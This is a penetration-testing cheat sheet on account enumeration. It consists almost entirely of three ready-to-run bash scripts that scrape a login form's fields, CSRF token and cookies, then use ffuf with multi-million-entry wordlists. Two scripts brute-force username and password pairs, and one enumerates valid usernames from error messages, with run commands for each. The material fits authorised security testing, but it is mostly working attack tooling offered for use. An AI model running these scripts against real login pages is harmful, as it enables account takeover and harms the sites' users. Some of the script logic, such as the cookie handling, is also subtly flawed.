# Account Enumeration



## Check List

* [ ] Review processes that pertain to user identification (e.g. registration, login, etc.).
* [ ] Enumerate users where possible through response analysis.

## Cheat Sheet

### Status Code

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano sc-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x sc-user-enum.sh;sudo ./sc-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### Error Message

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano em-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x em-user-enum.sh;sudo ./em-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### **Nonexistent Username**

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano nu-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=Fakepassword1234"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x nu-user-enum.sh;sudo ./nu-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
